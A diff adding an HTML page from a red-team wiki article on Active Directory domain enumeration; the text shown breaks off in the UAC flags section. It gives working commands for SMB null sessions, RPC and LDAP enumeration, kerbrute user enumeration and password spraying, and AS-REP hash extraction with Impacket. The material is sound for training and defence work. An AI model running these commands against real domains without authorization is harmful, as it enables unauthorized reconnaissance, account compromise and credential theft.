@@ -1,0 +1,1591 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Domain Enumeration | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Domain Enumeration">
+		<meta name="keywords" content="active-directory, bloodhound, dns, domain-enumeration, kerberos, ldap, redteam, rpc, smb">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Domain Enumeration">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Systematic enumeration of Active Directory domains, users, groups, computers, trusts, GPOs, and ACLs with and without domain credentials using DNS, LDAP, SMB, RPC, and BloodHound.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/domain-enumeration.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Domain Enumeration">
+		<meta name="twitter:description" itemprop="description" content="Systematic enumeration of Active Directory domains, users, groups, computers, trusts, GPOs, and ACLs with and without domain credentials using DNS, LDAP, SMB, RPC, and BloodHound.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#understanding-the-domain">Understanding the Domain</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#enumeration-without-domain-credentials">Enumeration Without Domain Credentials</a></b>
+					<ul>
+						<li><a href="#dns-service-record-discovery">DNS Service Record Discovery</a></li>
+						<li><a href="#ldap-anonymous-binds-rootdse-queries">LDAP Anonymous Binds - RootDSE Queries</a></li>
+						<li><a href="#smb-null-sessions">SMB Null Sessions</a></li>
+						<li><a href="#enum4linux-ng-null-sessions">enum4linux-ng Null Sessions</a></li>
+						<li><a href="#rpc-endpoint-mapper-rpcclient">RPC Endpoint Mapper - rpcclient</a></li>
+						<li><a href="#kerberos-user-enumeration-kerbrute">Kerberos User Enumeration - kerbrute</a></li>
+						<li><a href="#as-rep-roasting-enumeration">AS-REP Roasting Enumeration</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#enumeration-with-domain-credentials">Enumeration With Domain Credentials</a></b>
+					<ul>
+						<li><a href="#ldap-queries-with-ldapsearch">LDAP Queries with ldapsearch</a></li>
+						<li><a href="#user-account-control-uac-flags">User Account Control (UAC) Flags</a></li>
+						<li><a href="#kerberoastable-service-accounts">Kerberoastable Service Accounts</a></li>
+						<li><a href="#bloodhound-data-collection">BloodHound Data Collection</a></li>
+						<li><a href="#bloodhound-path-to-domain-admin">BloodHound Path to Domain Admin</a></li>
+						<li><a href="#group-enumeration-key-groups">Group Enumeration - Key Groups</a></li>
+						<li><a href="#computer-enumeration">Computer Enumeration</a></li>
+						<li><a href="#gpo-enumeration">GPO Enumeration</a></li>
+						<li><a href="#trust-enumeration">Trust Enumeration</a></li>
+						<li><a href="#acl-privilege-escalation-paths">ACL Privilege Escalation Paths</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/domain-enumeration.html">Domain Enumeration</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="domain-enumeration">Domain Enumeration</h2>
+					<p>
+						Systematic enumeration of Active Directory domains, users, groups, computers, trusts,
+						<abbr title="Group Policy Object">GPO</abbr>
+						s, and
+						<abbr title="Access Control List">ACL</abbr>
+						s with and without domain credentials using
+						<abbr title="Domain Name System">DNS</abbr>
+						,
+						<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+						,
+						<abbr title="Server Message Block">SMB</abbr>
+						,
+						<abbr title="Remote Procedure Call">RPC</abbr>
+						, and BloodHound.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Active Directory stores users, groups, computers, trusts, and policies in a replicated database
+							that any authenticated account can read over
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							.
+							Mapping that structure before an attack reveals which accounts are privileged, which services
+							are Kerberoastable, and which delegation and
+							<abbr title="Access Control List">ACL</abbr>
+							edges lead to Domain
+							Admin. This article covers discovery without credentials, authenticated collection with
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							and BloodHound, and the object attributes that make each attack path possible.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/dns.html">/wiki/articles/fundamentals/dns.html</a> - <abbr title="Domain Name System">DNS</abbr> , SRV records, zone structure, service discovery</li>
+							<li><a href="/wiki/articles/fundamentals/authentication.html">/wiki/articles/fundamentals/authentication.html</a> - Kerberos authentication flow, <abbr title="NT LAN Manager">NTLM</abbr> challenge-response protocol</li>
+							<li><a href="/wiki/articles/fundamentals/authorization.html">/wiki/articles/fundamentals/authorization.html</a> - access control entries, group membership, ACE inheritance</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="understanding-the-domain">Understanding the Domain</h3>
+						<p>
+							Active Directory is a hierarchy of objects - users, groups, computers, policies - managed by
+							Domain Controllers and stored in a multi-master replicated database exposed through
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							. Before you can attack a domain, you must understand its structure. Enumeration is the process
+							of mapping that structure: discovering what exists, how it is organized, and who has power over
+							what.
+						</p>
+						<p>A diagram of the logical hierarchy:</p>
+						<pre class="plaintext">
+Forest (forest root domain + child domains, shared schema/configuration/GC)
+├── Domain Tree 1: corp.example.com
+│   ├── OUs: Accounts / Servers / Workstations / Groups / ServiceAccounts / Admins
+│   └── Child Domain: us.corp.example.com
+└── Domain Tree 2: subsidiary.example.com (separate tree in same forest)
+						</pre>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Concept</th>
+									<th align="center">Definition</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><b>Forest</b></td>
+									<td align="center">The security boundary. All objects in a forest share a common schema, configuration partition, and at least one Global Catalog. A forest can contain multiple domain trees.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Domain</b></td>
+									<td align="center">An administrative boundary for users, groups, computers. Each domain has its own Domain Controllers and replication scope. The forest root domain is the first domain created; it hosts the Enterprise Admins and Schema Admins groups.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Domain Tree</b></td>
+									<td align="center">A parent domain and its child domains, sharing a contiguous DNS namespace (e.g. corp.example.com -> us.corp.example.com -> ny.us.corp.example.com).</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Trust</b></td>
+									<td align="center">A relationship between domains that allows authentication across domain boundaries. Trusts within a forest are transitive two-way by default. External/Forest trusts may be one-way or two-way.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Organization Unit (OU)</b></td>
+									<td align="center">A container for grouping objects for administrative delegation and GPO application. OUs are the primary mechanism for delegating control.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Domain Controller (DC)</b></td>
+									<td align="center">A server that hosts a writable copy of the domain database, authenticates users, and enforces security policy. The PDC Emulator role owner is the authoritative time source and password change notification server.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Global Catalog (GC)</b></td>
+									<td align="center">A partial, read-only replica of every object in the forest. The GC contains a subset of attributes for all objects (including cross-domain/cross-tree). Essential for forest-wide searches, Universal Group membership resolution, and UPN-based logons.</td>
+								</tr>
+								<tr>
+									<td align="center"><b>Security Identifier (SID)</b></td>
+									<td align="center">Every security principal (user, group, computer) has a unique SID. Format:<code>S-1-5-21-&lt;DOMAIN-RID&gt;-&lt;OBJECT-RID&gt;</code>. Built-in RIDs: Administrator=500, Guest=501, Domain Admins=512, Domain Users=513, Domain Computers=515, Domain Controllers=516.</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# A human-readable Domain SID looks like:
+# S-1-5-21-1122334455-1122334455-1122334455-500  (Administrator)
+#   -------- --------------------------  ---
+#     SID    Domain Identifier           RID
+#
+# Well-known SIDs (machine-local, same on every Windows install):
+# S-1-5-18      SYSTEM (LocalSystem)
+# S-1-5-19      LOCAL SERVICE
+# S-1-5-20      NETWORK SERVICE
+# S-1-5-32-544  Builtin\Administrators
+# S-1-5-32-545  Builtin\Users
+# S-1-5-32-551  Builtin\Backup Operators
+#
+# Domain-scoped well-known RIDs:
+# RID 500  →  Administrator (the domain Administrator account)
+# RID 501  →  Guest
+# RID 502  →  krbtgt (Kerberos KDC service account — THE high-value target)
+# RID 512  →  Domain Admins group
+# RID 513  →  Domain Users group
+# RID 514  →  Domain Guests group
+# RID 515  →  Domain Computers group
+# RID 516  →  Domain Controllers group
+# RID 518  →  Schema Admins group (forest root domain only)
+# RID 519  →  Enterprise Admins group (forest root domain only)
+# RID 520  →  Group Policy Creator Owners
+# RID 526  →  Key Admins
+# RID 527  →  Enterprise Key Admins
+						</pre>
+						<p>
+							Understanding these RIDs is essential: when you see a SID ending in -500, you know you have
+							the Administrator account. When you see -502, you know the krbtgt account is in play - that's
+							the Golden Ticket target.
+						</p>
+					</section>
+					<section>
+						<h3 id="enumeration-without-domain-credentials">Enumeration Without Domain Credentials</h3>
+						<p>
+							No domain credentials? No problem. AD exposes significant information through
+							<abbr title="Domain Name System">DNS</abbr>
+							,
+							<abbr title="Server Message Block">SMB</abbr>
+							,
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							anonymous binds,
+							and protocol-level behavior. The Kerberos protocol itself leaks user existence.
+						</p>
+						<h4 id="dns-service-record-discovery">DNS Service Record Discovery</h4>
+						<p>
+							Every Domain Controller registers SRV records so clients can find services. These records are
+							publicly resolvable if you can reach the
+							<abbr title="Domain Name System">DNS</abbr>
+							server on
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							53 or
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							53.
+						</p>
+						<pre class="bash">
+# Discover the Primary Domain Controller (PDC) — the PDC FSMO role holder
+dig SRV _ldap._tcp.pdc._msdcs.domain.local @10.0.0.1
+
+# Discover all Domain Controllers via LDAP service records
+dig SRV _ldap._tcp.domain.local @10.0.0.1
+
+# Discover Kerberos KDC (Key Distribution Center) — port 88
+dig SRV _kerberos._tcp.domain.local @10.0.0.1
+
+# Discover Kerberos password change service — port 464
+dig SRV _kpasswd._tcp.domain.local @10.0.0.1
+
+# Discover Global Catalog servers — port 3268 (LDAP), 3269 (LDAPS)
+dig SRV _gc._tcp.domain.local @10.0.0.1
+
+# Often the DC is both the DNS server and LDAP/KDC — test if the DNS server
+# itself resolves AD zones. Try a zone transfer (rarely works, always worth trying):
+dig AXFR domain.local @10.0.0.1
+						</pre>
+						<pre class="bash">
+# Composite discovery: ask the DC for all relevant SRV records in one sweep
+DOMAIN=&#34;domain.local&#34;
+DC=&#34;10.0.0.1&#34;
+for SRV in &#34;_ldap._tcp.${DOMAIN}&#34; &#34;_ldap._tcp.pdc._msdcs.${DOMAIN}&#34; \
+           &#34;_kerberos._tcp.${DOMAIN}&#34; &#34;_kpasswd._tcp.${DOMAIN}&#34; \
+           &#34;_gc._tcp.${DOMAIN}&#34; &#34;_ldap._tcp.dc._msdcs.${DOMAIN}&#34;; do
+    echo &#34;=== $SRV ===&#34;
+    dig +short SRV &#34;$SRV&#34; @&#34;$DC&#34;
+done
+						</pre>
+						<p>
+							Expected output: Each SRV record returns
+							<code>priority weight port hostname</code>
+							. The hostname reveals
+							the
+							<abbr title="Fully Qualified Domain Name">FQDN</abbr>
+							of each Domain Controller. Collect every
+							<abbr title="Domain Controller">DC</abbr>
+							hostname and
+							<abbr title="Internet Protocol">IP</abbr>
+							- you will need them for every subsequent step.
+						</p>
+						<pre class="bash">
+# Resolve each DC hostname to an IP
+dig +short A dc01.domain.local @10.0.0.1
+dig +short A dc02.domain.local @10.0.0.1
+
+# Also resolve the domain name itself — usually points to a DC
+dig +short A domain.local @10.0.0.1
+						</pre>
+						<h4 id="ldap-anonymous-binds-rootdse-queries">LDAP Anonymous Binds - RootDSE Queries</h4>
+						<p>
+							The RootDSE is the root of the
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							directory tree.
+							It is accessible with an anonymous bind on most domains unless hardened. RootDSE exposes the
+							forest name, domain name, naming contexts, supported SASL mechanisms, and
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							version - all without any credentials.
+						</p>
+						<pre class="bash">
+# Install openldap on ArchLinux for the ldapsearch binary
+sudo pacman -S openldap
+
+# Query RootDSE with anonymous bind (-x = simple auth, no credentials)
+ldapsearch -x -H ldap://10.0.0.1 -s base -b &#34;&#34; &#34;(objectclass=*)&#34; \* + 2&gt;/dev/null
+						</pre>
+						<p>Key attributes in the RootDSE response:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Attribute</th>
+									<th align="center">Meaning</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>rootDomainNamingContext</code></td>
+									<td align="center">The base DN of the forest root domain (e.g.<code>DC=corp,DC=local</code>)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>defaultNamingContext</code></td>
+									<td align="center">The base DN of the domain this DC belongs to (same as rootDNC for forest root)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>configurationNamingContext</code></td>
+									<td align="center"><code>CN=Configuration,...</code>- forest-wide config, site topology, partitions</td>
+								</tr>
+								<tr>
+									<td align="center"><code>schemaNamingContext</code></td>
+									<td align="center"><code>CN=Schema,...</code>- attribute and class definitions</td>
+								</tr>
+								<tr>
+									<td align="center"><code>supportedSASLMechanisms</code></td>
+									<td align="center"><code>GSSAPI</code>,<code>GSS-SPNEGO</code>,<code>EXTERNAL</code>- tells you Kerberos is available</td>
+								</tr>
+								<tr>
+									<td align="center"><code>supportedLDAPVersion</code></td>
+									<td align="center">Should be<code>3</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>dnsHostName</code></td>
+									<td align="center">The DCs own FQDN (e.g.<code>dc01.corp.local</code>)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ldapServiceName</code></td>
+									<td align="center"><code>corp.local:dc01$@CORP.LOCAL</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>serverName</code></td>
+									<td align="center">Distingished Name of the server object</td>
+								</tr>
+								<tr>
+									<td align="center"><code>domainControllerFunctionality</code></td>
+									<td align="center">Domain functional level (e.g.<code>7</code>= Windows Server 2016)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>forestFunctionality</code></td>
+									<td align="center">Forest functional level</td>
+								</tr>
+								<tr>
+									<td align="center"><code>isSynchronized</code></td>
+									<td align="center"><code>TRUE</code>if the DC has completed its initial replication</td>
+								</tr>
+								<tr>
+									<td align="center"><code>highestCommittedUSN</code></td>
+									<td align="center">Update Sequence Number - for tracking replication state</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# Extract the naming contexts alone — this gives you the base domain and forest DN
+ldapsearch -x -H ldap://10.0.0.1 -s base -b &#34;&#34; &#34;(objectclass=*)&#34; \
+    defaultNamingContext configurationNamingContext rootDomainNamingContext 2&gt;/dev/null | \
+    grep -E &#39;namingContext|NamingContext&#39;
+
+# Output example:
+# defaultNamingContext: DC=corp,DC=local
+# configurationNamingContext: CN=Configuration,DC=corp,DC=local
+# rootDomainNamingContext: DC=corp,DC=local
+						</pre>
+						<p>
+							The
+							<code>DC=corp,DC=local</code>
+							format tells you the domain's Distinguished Name (DN) components. A DN
+							with
+							<code>DC=us,DC=corp,DC=local</code>
+							would indicate a child domain
+							<code>us.corp.local</code>
+							.
+						</p>
+						<h4 id="smb-null-sessions">SMB Null Sessions</h4>
+						<p>
+							A null session connects to the
+							<abbr title="Server Message Block">SMB</abbr>
+							service on a Windows host without
+							providing credentials (empty username, empty password). On older configurations or misconfigured
+							servers, this exposes shares, users, groups, and security policies.
+						</p>
+						<pre class="bash">
+# Enumerate SMB shares without credentials
+smbclient -L //10.0.0.1 -N
+
+# Expected output on a hardened DC (2016+):
+# Anonymous login successful
+# Sharename       Type      Comment
+# ---------       ----      -------
+# ADMIN$          Disk      Remote Admin
+# C$              Disk      Default share
+# IPC$            IPC       Remote IPC
+# NETLOGON        Disk      Logon server share
+# SYSVOL          Disk      Logon server share
+# Reconnecting with SMB1 for workgroup listing.
+# Unable to connect with SMB1 -- SMB1 disabled (expected on modern systems)
+						</pre>
+						<p>
+							The presence of
+							<code>SYSVOL</code>
+							and
+							<code>NETLOGON</code>
+							confirms this is a Domain Controller - these shares
+							store Group Policy templates and logon scripts. Access them read-only if the null session grants
+							it:
+						</p>
+						<pre class="bash">
+# List contents of SYSVOL (Group Policy files)
+smbclient //10.0.0.1/SYSVOL -N -c &#34;ls&#34;
+
+# List contents of NETLOGON (login scripts — often contain domain user mappings)
+smbclient //10.0.0.1/NETLOGON -N -c &#34;ls&#34;
+						</pre>
+						<h4 id="enum4linux-ng-null-sessions">enum4linux-ng Null Sessions</h4>
+						<p>
+							<code>enum4linux-ng</code>
+							is a Python rewrite of the classic enum4linux Perl script. It automates
+							<abbr title="Server Message Block">SMB</abbr>
+							null session enumeration: share listing, user enumeration, group enumeration, RID cycling, password
+							policy extraction, OS detection.
+						</p>
+						<pre class="bash">
+# Install
+yay -S enum4linux-ng
+# or: pacman -S enum4linux-ng  (if in community)
+# or: pip install enum4linux-ng
+
+# Full enumeration against a target
+enum4linux-ng -A 10.0.0.1
+
+# Break down what -A does:
+# -S : OS detection via SMB   (reads the Native OS / Native LanMan fields)
+# -U : user listing via RID cycling (SAMR)
+# -R : RID cycling — brute-force SIDs 500-550 to enumerate built-in users
+# -G : group listing
+# -P : password policy extraction
+# -O : domain/workgroup info
+# -N : NetBIOS name table (nbstat)
+						</pre>
+						<pre class="bash">
+# If null sessions are blocked, try with guest credentials
+enum4linux-ng -A -u &#34;guest&#34; -p &#34;&#34; 10.0.0.1
+
+# Targeted RID cycling — only enumerate a specific range (faster, quieter)
+enum4linux-ng -R 500-2000 10.0.0.1
+
+# Extract password policy — reveals lockout threshold, minimum password length,
+# password history, and maximum password age. CRITICAL for planning password spray attacks.
+enum4linux-ng -P 10.0.0.1
+						</pre>
+						<p>Example password policy output:</p>
+						<pre class="plaintext">
+Domain Password Information:
+  Password history length: 24
+  Minimum password length: 8
+  Minimum password age: 1 day 0 hours 0 minutes
+  Maximum password age: 42 days 0 hours 0 minutes
+  Password properties:
+    DOMAIN_PASSWORD_COMPLEX: 1      # Must meet complexity requirements
+    DOMAIN_PASSWORD_NO_ANON_CHANGE: 1
+    DOMAIN_PASSWORD_NO_CLEAR_CHANGE: 1
+    DOMAIN_LOCKOUT_ADMINS: 0         # Admin accounts are NOT subject to lockout
+    DOMAIN_PASSWORD_STORE_CLEARTEXT: 0
+    DOMAIN_REFUSE_PASSWORD_CHANGE: 0
+  Lockout threshold: 5
+  Lockout duration: 30 minutes
+  Lockout observation window: 30 minutes
+						</pre>
+						<p>
+							Key takeaway from this output: if
+							<code>DOMAIN_LOCKOUT_ADMINS</code>
+							is
+							<code>0</code>
+							(default on many domains),
+							admin accounts do not get locked out. You can spray passwords against Domain Admins indefinitely
+							<ul>
+								<li>the highest-impact password spray target.</li>
+							</ul>
+						</p>
+						<h4 id="rpc-endpoint-mapper-rpcclient">RPC Endpoint Mapper - rpcclient</h4>
+						<p>
+							The
+							<abbr title="Remote Procedure Call">RPC</abbr>
+							Endpoint Mapper listens on
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							135 and tells you which
+							<abbr title="Remote Procedure Call">RPC</abbr>
+							services are running on which dynamic ports.
+							<code>rpcclient</code>
+							speaks the SAMR (Security Account Manager Remote) protocol over a named pipe to
+							enumerate users and groups.
+						</p>
+						<pre class="bash">
+# Connect with a null session
+rpcclient -U &#34;&#34; -N 10.0.0.1
+
+# Once connected, run these commands:
+rpcclient $&gt; srvinfo             # OS version, domain role
+rpcclient $&gt; enumdomusers        # List all domain users (RID + username)
+rpcclient $&gt; enumdomgroups       # List all domain groups (RID + group name)
+rpcclient $&gt; querygroup 512      # Get members of Domain Admins (RID 512)
+rpcclient $&gt; querygroupmem 512   # Same — membership of group by RID
+rpcclient $&gt; queryuser 500       # Get info for Administrator (RID 500)
+rpcclient $&gt; getdompwinfo        # Password policy (same info as enum4linux -P)
+rpcclient $&gt; lsaquery            # Get domain SID and name
+rpcclient $&gt; lookupnames admin*  # Resolve a wildcard username to RID
+rpcclient $&gt; querydispinfo       # List users with description fields
+rpcclient $&gt; enumdrivers         # Enumerate installed printer drivers
+rpcclient $&gt; netshareenum        # Enumerate shares
+rpcclient $&gt; netsharegetinfo SYSVOL  # Get details on a specific share
+						</pre>
+						<pre class="bash">
+# Non-interactive rpcclient — chain commands with -c
+rpcclient -U &#34;&#34; -N 10.0.0.1 -c &#34;lsaquery; enumdomusers; enumdomgroups; getdompwinfo&#34;
+						</pre>
+						<p>
+							The
+							<code>lsaquery</code>
+							command gives you the domain SID:
+						</p>
+						<pre class="plaintext">
+LSA Query Info
+Domain Name: CORP
+Domain Sid: S-1-5-21-1122334455-1122334455-1122334455
+						</pre>
+						<p>
+							Write this SID down. You need it for Golden Ticket attacks, Silver Ticket attacks, and BloodHound
+							analysis.
+						</p>
+						<h4 id="kerberos-user-enumeration-kerbrute">Kerberos User Enumeration - kerbrute</h4>
+						<p>
+							The Kerberos pre-authentication step leaks valid usernames. When a user exists but the password
+							is wrong, the K
+							<abbr title="Domain Controller">DC</abbr>
+							returns
+							<code>KDC_ERR_PREAUTH_FAILED</code>
+							. When a user does
+							not exist, the K
+							<abbr title="Domain Controller">DC</abbr>
+							returns
+							<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>
+							. This timing/response
+							difference enables brute-force user enumeration against the K
+							<abbr title="Domain Controller">DC</abbr>
+							on port
+							88 without triggering Windows event log 4771 (Kerberos pre-auth failure) for nonexistent users
+							<ul>
+								<li>there is no event because no ticket request is created.</li>
+							</ul>
+						</p>
+						<p>
+							<code>kerbrute</code>
+							is a Go tool that enumerates users via this mechanism. It is fast (thousands of usernames
+							per second), does not trigger lockouts (no password is attempted), and is quiet (no logon failure
+							events).
+						</p>
+						<pre class="bash">
+# Install kerbrute on ArchLinux
+yay -S kerbrute
+# or manually: go install github.com/ropnop/kerbrute@latest
+
+# User enumeration — supply a wordlist of potential usernames
+kerbrute userenum -d corp.local --dc 10.0.0.1 /usr/share/wordlists/usernames.txt
+
+# Output:
+# [+] VALID USERNAME:  administrator@corp.local
+# [+] VALID USERNAME:  jsmith@corp.local
+# [+] VALID USERNAME:  svc_sql@corp.local
+# [+] VALID USERNAME:  backup_svc@corp.local
+# [X] INVALID:         nonexistent@corp.local
+						</pre>
+						<pre class="bash">
+# Generate a username wordlist from common first/last name combinations
+# If you have a list of employee names from OSINT (LinkedIn, company website):
+while IFS=&#39; &#39; read -r first last; do
+    echo &#34;${first,,}${last,,}&#34;           # janesmith
+    echo &#34;${first,,}.${last,,}&#34;          # jane.smith
+    echo &#34;${first:0:1}${last,,}&#34;         # jsmith
+    echo &#34;${first:0:1}.${last,,}&#34;        # j.smith
+    echo &#34;${last,,}${first:0:1}&#34;         # smithj
+    echo &#34;${first,,}&#34;                     # jane
+    echo &#34;${last,,}&#34;                      # smith
+done &lt; employee_names.txt | sort -u &gt; usernames.txt
+
+# Also add common service account and default account names:
+# administrator, guest, krbtgt, sqlsvc, sqlservice, backup, svc_backup,
+# svc_sql, svc_mssql, svc_web, svc_sharepoint, svc_exchange, helpdesk,
+# scanner, nessus, qualys, monitor, nagios, zabbix, admin_*, *_admin
+						</pre>
+						<pre class="bash">
+# kerbrute also performs password spraying (use AFTER user enumeration)
+kerbrute passwordspray -d corp.local --dc 10.0.0.1 \
+    --userfile valid-users.txt &#39;Spring2024!&#39;  # single password against all users
+
+# kerbrute can also spray from a password list, but single-password-per-spray
+# is the correct approach — one password across all users, not vice versa
+kerbrute passwordspray -d corp.local --dc 10.0.0.1 \
+    --userfile valid-users.txt &#39;Password123&#39;
+
+# Bruteforce — one user, many passwords (will trigger lockouts, use sparingly)
+kerbrute bruteuser -d corp.local --dc 10.0.0.1 \
+    /usr/share/wordlists/passwords.txt administrator
+						</pre>
+						<h4 id="as-rep-roasting-enumeration">AS-REP Roasting Enumeration</h4>
+						<p>
+							<code>GetNPUsers.py</code>
+							from Impacket requests an AS-REQ without pre-authentication for users who have
+							the
+							<code>UF_DONT_REQUIRE_PREAUTH</code>
+							flag set. Even when you provide no password, the K
+							<abbr title="Domain Controller">DC</abbr>
+							returns an AS-REP containing encrypted data crackable offline. The tool can also query
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							(if you have credentials) to list all users with this flag.
+						</p>
+						<p>Without credentials, you can supply a list of usernames and the tool will test each one:</p>
+						<pre class="bash">
+# Install impacket
+sudo pacman -S python-impacket
+
+# Without credentials: test a username list for AS-REP-roastable users
+GetNPUsers.py -no-pass -dc-ip 10.0.0.1 corp.local/ -usersfile valid-users.txt
+
+# Output for roastable users:
+# $krb5asrep$23$jsmith@CORP.LOCAL:ab12cd34...hash...
+# (Save this hash — crack with hashcat -m 18200)
+						</pre>
+						<pre class="bash">
+# With credentials: LDAP query for all users with UF_DONT_REQUIRE_PREAUTH
+GetNPUsers.py -dc-ip 10.0.0.1 corp.local/user:password -request
+
+# With credentials + output each hash to a file
+GetNPUsers.py -dc-ip 10.0.0.1 corp.local/user:password -request -outputfile asrep-hashes.txt
+						</pre>
+					</section>
+					<section>
+						<h3 id="enumeration-with-domain-credentials">Enumeration With Domain Credentials</h3>
+						<p>
+							Once you have valid credentials for even the lowest-privileged domain user, the attack surface
+							explodes. Any authenticated user can query
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							for
+							domain objects. Most domains do not restrict
+							<abbr title="Lightweight Directory Access Protocol">LDAP</abbr>
+							read
+							access to object attributes - even Guest can list every user, group, computer, and
+							<abbr title="Group Policy Object">GPO</abbr>
+							.
+						</p>
+						<h4 id="ldap-queries-with-ldapsearch">LDAP Queries with ldapsearch</h4>
+						<pre class="bash">
+# Authenticated LDAP search with simple bind
+# -x = simple authentication
+# -D = bind DN (user@domain format or CN=User,CN=Users,DC=corp,DC=local)
+# -w = password (use -W to prompt interactively to avoid shell history leakage)
+# -b = search base (the namingContext from RootDSE)
+# -H = LDAP URI
+
+# List all users in the domain
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=user)&#34; \
+    cn samaccountname distinguishedname memberof useraccountcontrol mail \
+    2&gt;/dev/null | grep -v &#39;^#&#39; | grep -v &#39;^$&#39;
+
+# List all groups
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=group)&#34; \
+    cn samaccountname distinguishedname member 2&gt;/dev/null | grep -v &#39;^#&#39;
+
+# List all computers
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=computer)&#34; \
+    cn samaccountname operatingsystem operatingsystemservicepack lastlogontimestamp dnsHostName \
+    2&gt;/dev/null | grep -v &#39;^#&#39;
+
+# List all OUs
+ldapsearch -x -H ldap://10.0.0.1 \
+    -D &#34;jsmith@corp.local&#34; -w &#39;password&#39; \
+    -b &#34;DC=corp,DC=local&#34; \
+    &#34;(objectclass=organizationalUnit)&#34; \
+    ou distinguishedname 2&gt;/dev/null | grep -v &#39;^#&#39;
+						</pre>
+						<h4 id="user-account-control-uac-flags">User Account Control (UAC) Flags</h4>
+						<p>
+							The
+							<code>userAccountControl</code>
